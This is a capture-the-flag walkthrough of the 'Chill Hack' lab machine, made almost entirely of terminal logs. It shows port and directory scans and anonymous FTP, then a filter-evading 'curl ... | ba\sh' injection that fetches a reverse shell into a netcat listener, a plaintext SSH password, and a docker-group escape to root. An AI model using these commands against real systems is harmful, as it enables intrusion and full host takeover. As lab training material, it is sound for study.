# Chill Hack
## Easy
## NMAP
```bash
nmap -sC -sV 10.201.78.6 -oN nmap_report 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 12:36 WIB
Nmap scan report for 10.201.78.6
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.253
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1c:ad:43:60:94:1e:11:93:66:06:fc:40:a2:20:89:ae (RSA)
|   256 97:c3:f9:42:26:62:a4:1e:ca:8c:bd:4a:de:75:2a:eb (ECDSA)
|_  256 92:28:71:37:e7:8f:74:38:f7:e4:9d:66:b3:c2:8f:f3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.09 seconds
```
```bash
tp 10.201.78.6       
Connected to 10.201.78.6.
220 (vsFTPd 3.0.5)
Name (10.201.78.6:santstyle): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53385|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||16322|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> mget *
mget note.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||52970|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |***********************************************************************************************************************************************************************************************|    90        1.16 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.20 KiB/s)
ftp> 
```
```bash
cat note.txt 
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
```bash
 gobuster dir -u http://10.201.78.6/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.78.6/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.201.78.6/images/]
/css                  (Status: 301) [Size: 308] [--> http://10.201.78.6/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.201.78.6/js/]
/fonts                (Status: 301) [Size: 310] [--> http://10.201.78.6/fonts/]
/secret               (Status: 301) [Size: 311] [--> http://10.201.78.6/secret/]
Progress: 27194 / 220561 (12.33%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 27204 / 220561 (12.33%)
===============================================================
Finished
===============================================================
```
```
/secret/
```

```bash
vim shell.sh
```
```bash
python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

```bash
nc -nvlp 9001 
listening on [any] 9001 ...
```
- Using `curl 10.9.1.253:8000/shell.sh | ba\sh` and paste to form in web 
```bash
c -nvlp 9001 
listening on [any] 9001 ...
connect to [10.9.1.253] from (UNKNOWN) [10.201.78.6] 50372
bash: cannot set terminal process group (839): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-201-78-6:/var/www/html/secret$
```
```bash
www-data@ip-10-201-78-6:/var/www/html/secret$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<et$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-201-78-6:/var/www/html/secret$ ^Z
```
```bash
tty raw -echo;fg
[1]  + continued  nc -nvlp 9001
                               export TERM=screen
www-data@ip-10-201-78-6:/var/www/html/secret$ 
```
```bash
www-data@ip-10-201-78-6:/var/www/html/secret$ ls -la
total 16
drwxr-xr-x 3 root root 4096 Oct  4  2020 .
drwxr-xr-x 8 root root 4096 Oct  3  2020 ..
drwxr-xr-x 2 root root 4096 Oct  3  2020 images
-rw-r--r-- 1 root root 1520 Oct  4  2020 index.php
www-data@ip-10-201-78-6:/var/www/html/secret$ ls -la ..
total 264
drwxr-xr-x 8 root root  4096 Oct  3  2020 .
drwxr-xr-x 4 root root  4096 Oct  3  2020 ..
-rw-r--r-- 1 root root 21339 May 31  2018 about.html
-rw-r--r-- 1 root root 30279 May 31  2018 blog.html
-rw-r--r-- 1 root root 18301 May 31  2018 contact.html
-rw-r--r-- 1 root root  3769 Oct 24  2017 contact.php
drwxr-xr-x 2 root root  4096 May 31  2018 css
drwxr-xr-x 2 root root  4096 May 31  2018 fonts
drwxr-xr-x 4 root root  4096 May 31  2018 images
-rw-r--r-- 1 root root 35184 May 31  2018 index.html
drwxr-xr-x 2 root root  4096 May 31  2018 js
-rw-r--r-- 1 root root 19718 May 31  2018 news.html
drwxr-xr-x 2 root root  4096 May 31  2018 preview_img
drwxr-xr-x 3 root root  4096 Oct  4  2020 secret
-rw-r--r-- 1 root root 32777 May 31  2018 single-blog.html
-rw-r--r-- 1 root root 37910 May 31  2018 style.css
-rw-r--r-- 1 root root 19868 May 31  2018 team.html
```
```bash
www-data@ip-10-201-78-6:/var/www/files$ cat /etc/passwd | egrep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
www-data@ip-10-201-78-6:/var/www/files$ 
```

#### Password ssh
```txt
!d0ntKn0wmYp@ssw0rd
```

```bash
ssh anurodh@10.201.78.6 
anurodh@10.201.78.6's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu 06 Nov 2025 06:56:29 AM UTC

  System load:  0.47               Processes:             126
  Usage of /:   34.5% of 18.53GB   Users logged in:       0
  Memory usage: 34%                IPv4 address for eth0: 10.201.78.6
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Your Hardware Enablement Stack (HWE) is supported until April 2025.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

anurodh@ip-10-201-78-6:
```
```bash
anurodh@ip-10-201-78-6:~$ docker images
REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
alpine        latest    a24bb4013296   5 years ago   5.57MB
hello-world   latest    bf756fb1ae65   5 years ago   13.3kB
anurodh@ip-10-201-78-6:~$ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@1abf7c4f3a18:/# cat /home/apaar/local.txt
```
```bash
root@1abf7c4f3a18:/# ls /root
proof.txt
```